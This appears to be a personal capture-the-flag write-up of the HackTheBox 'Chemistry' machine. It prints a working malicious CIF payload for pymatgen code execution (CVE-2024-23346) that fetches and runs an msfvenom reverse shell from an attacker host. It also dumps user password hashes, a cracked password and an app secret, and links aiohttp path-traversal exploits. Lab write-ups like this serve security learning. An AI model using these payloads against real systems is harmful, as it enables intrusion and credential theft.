---
tags:
  - HTB
  - Linux
  - Seasonal
  - pymatgen
  - aiohttp
creation date: 2018-09-29
Date Completed: 2024-08-21
CVEs: CVE-2024-23334 CVE-2024-23346
URL: 
IP: 10.129.225.128
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Fri, 25 Oct 2024 17:30:26 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

```

### ffuf (Directories/Subdomain/Files)
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt:FUZZ -u http://10.129.225.128:5000/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u http://10.129.225.128:5000/FUZZ -c
```

`-recursion -recursion-depth 1`

When raft fails
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.225.128:5000/FUZZ -c
```
## Foothold

https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

this worked:
```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget http://10.10.15.64:8000/test");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

now to find a payload for a reverse shell 🙂

```
msfvenom -p linux/x64/shell_reverse_tcp lhost=10.10.15.64 lport=4444 -f elf > shell
```

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget http://10.10.15.64:8000/shell");0,0,0'
```


```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("chmod +x shell");0,0,0'
```

```
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("./shell");0,0,0'
```

## Internal Enumeration

![[Pasted image 20241025132412.png]]

MyS3cretCh3mistry4PP

```
sqlite3
.open database.db
.dump
```
![[Pasted image 20241025133825.png]]
admin:2861debaf8d99436a10ed6f75a252abf
app:197865e46b878d9e74a0346b6d59886a
'rosa','63ed86ee9f624c7b14f1d4f43dc251a5');
'robert','02fcf7cfc10adc37959fb21f06c6b467');
'jobert','3dec299e06f7ed187bac06bd3b670ab2');
INSERT INTO user VALUES(6,'carlos','9ad48828b0955513f7cf0f7f6510c8f8');
INSERT INTO user VALUES(7,'peter','6845c17d298d95aa942127bdad2ceb9b');
INSERT INTO user VALUES(8,'victoria','c3601ad2286a4293868ec2a4bc606ba3');
INSERT INTO user VALUES(9,'tania','a4aa55e816205dc0389591c9f82f43bb');
INSERT INTO user VALUES(10,'eusebio','6cad48078d0241cca9a7b322ecd073b3');
INSERT INTO user VALUES(11,'gelacia','4af70c80b68267012ecdac9a7e916d18');
INSERT INTO user VALUES(12,'fabian','4e5d71f53fdd2eabdbabb233113b5dc0');
INSERT INTO user VALUES(13,'axel','9347f9724ca083b17e39555c36fd9007');
INSERT INTO user VALUES(14,'kristel','6896ba7b11a62cacffbdaded457c6d92');
INSERT INTO user VALUES(15,'hacker','6a204bd89f3c8348afd5c77c717a097a');

cat app.py
![[Pasted image 20241025134208.png]]

```
hashcat -m 0 rosa ~/share/kali_backup/tools/rockyou.txt
su rosa
unicorniosrosados
```

![[Pasted image 20241026082910.png]]

![[Pasted image 20241026082932.png]]

```
ssh -D 9050 rosa@10.129.225.128
proxychains firefox http://127.0.0.1:8080
```

![[Pasted image 20241026083020.png]]

![[Pasted image 20241026083159.png]]

## Linpeas

nothing:
![[Pasted image 20241026090137.png]]

![[Pasted image 20241026090308.png]]

nothing:
![[Pasted image 20241026090408.png]]
nothing:
![[Pasted image 20241026090504.png]]
false:
![[Pasted image 20241026091937.png]]

proxychains4 dirb http://127.0.0.1:8080/

proxychains4 curl http://127.0.0.1/8080

rosa
unicorniosrosados

====
proxychains4 dirb http://127.0.0.1:8080
proxychains4 dirb http://127.0.0.1:8080/ /opt/useful/seclists/Discovery/Web-Content/raft-large-files.txt

curl http://127.0.0.1:8080/assests/js/script.js
curl http://127.0.0.1:8080/assets/css/style.css

# Priv Esc

proxychains whatweb -v http://127.0.0.1:8080
Python/3.9 aiohttp/3.9.1
https://github.com/z3rObyte/CVE-2024-23334-PoC
https://github.com/jhonnybonny/CVE-2024-23334/blob/main/exploit.py

If you actually read the exploit (sometimes it takes finding a good article that explains whats happening) it will be a lot easier to modify the exploit so it works.
https://github.com/wizarddos/CVE-2024-23334